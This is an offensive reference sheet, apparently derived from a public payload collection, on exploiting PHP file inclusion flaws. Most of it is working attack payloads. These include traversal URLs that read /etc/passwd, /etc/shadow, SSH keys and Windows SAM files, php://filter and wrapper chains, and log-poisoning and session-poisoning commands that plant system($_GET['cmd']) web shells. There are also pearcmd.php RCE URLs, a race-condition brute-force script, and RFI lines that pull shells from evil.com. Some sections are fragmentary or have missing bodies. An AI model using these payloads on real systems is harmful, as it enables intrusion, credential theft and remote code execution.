entries.title: What it is and where to look
entries.body:
File Inclusion - the application includes a file by a path taken from user input without proper filtering. Especially common in PHP.
• LFI (Local File Inclusion) - a local file is included; may lead to code execution.
• RFI (Remote File Inclusion) - a remote file is included by URL.
• Path Traversal differs from File Inclusion: traversal gives you file read, while inclusion leads to arbitrary code execution.
• Look in parameters like ?page=, ?file=, ?template=, ?include=, ?lang= - anything that looks like a file name or path.
• Start with ../../../etc/passwd (Linux) or ..\..\..\windows\win.ini (Windows); if it works - escalate to RCE via wrappers, log poisoning, upload.

entries.title: Vulnerable example in PHP
entries.body:
<?php
$file = $_GET['page'];
include($file);
?>

entries.title: Tools for finding and exploiting LFI/RFI
entries.body:
• hansmach1ne/LFImap - detection and exploitation of Local File Inclusion.
• kurobeats/fimap - finding, preparing, auditing and exploiting LFI/RFI in web applications.
• D35m0nd142/LFISuite - automatic LFI exploiter (+ reverse shell) and scanner.
• lightos/Panoptic - automates reading of common log and config files via path traversal.
• P0cL4bs/Kadimus - checking and exploiting LFI (archived in 2020).

entries.title: Basic /etc/passwd read via traversal
entries.body: http://example.com/index.php?page=../../../etc/passwd

entries.body: http://example.com/index.php?page=../../../etc/passwd%00

entries.title: Null Byte - real-world example (Joomla Web TV, CVE-2010-1470)
entries.body: {{BaseURL}}/index.php?option=com_webtv&controller=../../../../../../../../../../etc/passwd%00

entries.title: Double Encoding (%252e = .)
entries.body:
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00

entries.title: UTF-8 / overlong encoding (%c0%ae = .)
entries.body:
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00

entries.title: Path Truncation (PHP cuts paths > 4096 bytes)
entries.body:
http://example.com/index.php?page=../../../etc/passwd............[ADD MORE]
http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE] 
http://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd

entries.title: Bypassing recursive stripping of ../ (....// and //)
entries.body:
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd

rows: Recode index.php from utf8 to utf16
Output index.php as a base64 string

entries.title: php://filter - reading source (part of the name is case-insensitive)
entries.body:
http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php

entries.title: php://filter - chain with compression for large files
entries.body: http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd

entries.title: php://filter - chaining via | or /
entries.body:
Filters can be chained many times via | or /:
# multiple base64 decodes:
php://filter/convert.base64-decoder|convert.base64-decode|convert.base64-decode/resource=%s
# deflate + base64encode (useful for exfiltration with a limited character set):
php://filter/zlib.deflate/convert.base64-encode/resource=/var/www/html/index.php

entries.title: Download source via base64 (curl)
entries.body: curl "http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php" | base64 -d > index.php

entries.title: php_filter_chain_generator - generating a chain
entries.body:
# synacktiv/php_filter_chain_generator
$ python3 php_filter_chain_generator.py --chain '<?php phpinfo();?>'
[+] The following gadget chain will generate the following code : <?php phpinfo();?> (base64 value: PD9waHAgcGhwaW5mbygpOz8+)

http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls

entries.title: php://input - code in the POST body
entries.body: curl -X POST --data "<?php echo shell_exec('id'); ?>" "https://example.com/index.php?page=php://input%00" -k -v

entries.title: zip:// - webshell inside an archive
phar:// - archive structure with a backdoor
entries.body:
<?php
  $phar = new Phar('archive.phar');
  $phar->startBuffering();
  $phar->addFromString('test.txt', '<?php phpinfo(); ?>');
  $phar->setStub('<?php __HALT_COMPILER(); ?>');
  $phar->stopBuffering();
?>

entries.title: phar:// - build and include
entries.body:
# build (phar.readonly=0 required)
php --define phar.readonly=0 archive.php
# include a file inside the archive
curl http://127.0.0.1:8001/?page=phar:///var/www/html/archive.phar/test.txt

entries.title: PHAR deserialization - vulnerable class with a magic method
PHAR deserialization - building the archive with an object in meta-data
PHAR deserialization - JPG magic bytes in the stub
convert.iconv:// + dechunk:// - error-based oracle
php_filter_chains_oracle_exploit - auto file leak
entries.body:
# synacktiv/php_filter_chains_oracle_exploit
# oracle: HTTP 500 or response time
$ python3 filters_chain_oracle_exploit.py --target http://127.0.0.1 --file '/test' --parameter 0   
[*] The following URL is targeted : http://127.0.0.1
[*] The following local file is leaked : /test
[*] Running POST requests
[+] File /test leak is finished!

entries.title: wrapwrap - wrap file contents with a prefix/suffix
entries.body:
# ambionics/wrapwrap - generates a php://filter chain that adds a prefix and suffix
# target: {"message":"<file contents>"}
./wrapwrap.py /etc/passwd 'PREFIX' 'SUFFIX' 1000
./wrapwrap.py /etc/passwd '{"message":"' '"}' 1000
./wrapwrap.py /etc/passwd '<root><name>' '</name></root>' 1000

entries.title: wrapwrap - vulnerable target code
entries.body:
<?php
  $data = file_get_contents($_POST['url']);
  $data = json_decode($data);
  echo $data->message;
?>

entries.title: lightyear - blind file read primitive
entries.body:
# ambionics/lightyear
code remote.py # edit Remote.oracle
./lightyear.py test # test that your implementation works
./lightyear.py /etc/passwd # dump a file!

entries.title: Apache access.log - User-Agent poisoning
entries.body:
# logs escape double quotes - use single quotes in PHP strings
curl http://example.org/ -A "<?php system(\$_GET['cmd']);?>"
# then request the log via LFI and execute the command
curl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id

entries.title: SSH auth.log - poisoning via the username
entries.body:
# log in over SSH with PHP code in the username
ssh '<?php system($_GET["cmd"]);?>'@10.10.10.10
# then include the log
http://example.com/index.php?page=/var/log/auth.log&cmd=id

entries.title: Mail log - poisoning via SMTP
entries.body:
root@kali:~# telnet 10.10.10.10. 25
Trying 10.10.10.10....
Connected to 10.10.10.10..
Escape character is '^]'.
220 straylight ESMTP Postfix (Debian/GNU)
helo ok
250 straylight
mail from: mail@example.com
250 2.1.0 Ok
rcpt to: root
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
subject: <?php echo system($_GET["cmd"]); ?>
data2
.

# or with a single command:
mail -s "<?php system($_GET['cmd']);?>" www-data@10.10.10.10. < /dev/null
# then include /var/log/mail

entries.title: /proc/self/environ - poisoning via User-Agent
entries.body:
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>

entries.body:

# 2) include /proc/$PID/fd/$FD ($PID and $FD are brute-forced)
http://example.com/index.php?page=/proc/$PID/fd/$FD

entries.title: PHP sessions - path to the session file
entries.body:
Check whether the site uses PHPSESSID:
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/

The session file lives in one of:
/var/lib/php5/sess_[PHPSESSID]
/var/lib/php/sessions/sess_[PHPSESSID]

Contents (you can see the values you control):
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";

entries.title: PHP sessions - inject code and include the session file
entries.body:
# 1) write PHP code into the session via a controlled field
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
# 2) include the session file via LFI
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27

entries.title: pearcmd.php - RCE (register_argc_argv=On)
entries.body:
# pearcmd.php is installed by default in every php Docker image
# at /usr/local/lib/php/pearcmd.php; register_argc_argv=On is required

# Method 1: config-create
/vuln.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=eval($_GET['cmd'])?>+/tmp/exec.php
/vuln.php?file=/tmp/exec.php&cmd=phpinfo();die();

# Method 2: man_dir
/vuln.php?file=/usr/local/lib/php/pearcmd.php&+-c+/tmp/exec.php+-d+man_dir=<?echo(system($_GET['c']));?>+-s+
/vuln.php?file=/tmp/exec.php&c=id

# Method 3: download (network access required)
/vuln.php?file=/usr/local/lib/php/pearcmd.php&+download+http://<ip>:<port>/exec.php
/vuln.php?file=exec.php&c=id

# Method 4: install (network access required); exec.php -> /tmp/pear/download/exec.php
/vuln.php?file=/usr/local/lib/php/pearcmd.php&+install+http://<ip>:<port>/exec.php
/vuln.php?file=/tmp/pear/download/exec.php&c=id

entries.title: Self-inclusion of an uploaded file
entries.body:
# if you can upload a file - inject a shell into it (e.g. <?php system($_GET['c']); ?>)
# to keep the file valid, hide the code in the metadata of an image/doc/pdf
http://example.com/index.php?page=path/to/uploaded/file.png

entries.title: Race condition - brute-force /tmp/php* during upload
entries.body:
import itertools
import requests
import sys

print('[+] Trying to win the race')
f = {'file': open('shell.php', 'rb')}
for _ in range(4096 * 4096):
    requests.post('http://target.com/index.php?c=index.php', f)


print('[+] Bruteforcing the inclusion')
for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
    url = 'http://target.com/index.php?c=/tmp/php' + fname
    r = requests.get(url)
    if 'load average' in r.text:  # <?php echo system('uptime');
        print('[+] We have got a shell: ' + url)
        sys.exit(0)

print('[x] Something went wrong, please try again')

entries.title: Windows FindFirstFile - wildcard for the temp file
entries.body:
# Windows only. FindFirstFile allows masks in LFI paths:
#   << like *   (any sequence of characters)
#   >  like ?   (a single character)
# The uploaded file lands in C:\Windows\Temp\ with a name php[A-F0-9]{4}.tmp.
# Brute-force 65536 names or use a wildcard:
http://site/vuln.php?inc=c:\windows\temp\php<<

entries.title: phpinfo() - leaking the upload temp file name
entries.body:
phpinfo() reveals the contents of $_GET, $_POST and $_FILES. By making many upload requests to a script with phpinfo() and carefully reading the response, you can extract the temporary file name and include it via LFI before it is deleted.
Script: phpInfoLFI.py (PayloadsAllTheThings/File Inclusion/Files/phpinfolfi.py).

entries.title: iconv OOB in glibc -> RCE (cnext)
entries.body:
The iconv wrapper triggers an OOB in glibc (CVE-2024-2961), then LFI reads /proc/self/maps and downloads the glibc binary. RCE is achieved by exploiting the zend_mm_heap structure: free() is remapped to system via custom_heap._free.
Requirements:
• PHP 7.0.0 (2015) - 8.3.7 (2024)
• glibc <= 2.39
• access to the convert.iconv, zlib.inflate, dechunk filters
Exploit: ambionics/cnext-exploits.

entries.title: Remote File Inclusion - basic inclusion by URL
entries.body:
# does not work by default: in PHP 5 allow_url_include is off.
# Most of the LFI filter bypasses apply to RFI as well.
http://example.com/index.php?page=http://evil.com/shell.txt

entries.title: RFI - enable allow_url_include
entries.body: allow_url_include = On

entries.title: RFI - Null Byte and Double Encoding
entries.body:
http://example.com/index.php?page=http://evil.com/shell.txt%00
http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt

entries.title: Bypassing allow_url_include via SMB (Windows)
entries.body:
When allow_url_include and allow_url_fopen = Off, on Windows you can still include a remote file over smb:
1. Create a share open to everyone.
2. Write PHP code into the file shell.php.
3. Include it:
http://example.com/index.php?page=\\10.0.0.1\share\shell.php

entries.title: Linux - /etc/shadow and private SSH keys
entries.body:
# extract /etc/shadow and crack the hashes -> log in over SSH
http://example.com/index.php?page=../../../../../../etc/shadow
# or read the private key: identify the user from /etc/passwd,
# then read /<HOME>/.ssh/id_rsa for each user with a home directory

entries.title: Windows - SAM and SYSTEM for extracting hashes
entries.body:
http://example.com/index.php?page=../../../../../../WINDOWS/repair/sam
http://example.com/index.php?page=../../../../../../WINDOWS/repair/system
# then: samdump2 SYSTEM SAM > hashes.txt -> crack with hashcat/john or Pass-The-Hash

rows: list of users, home directories, LFI check
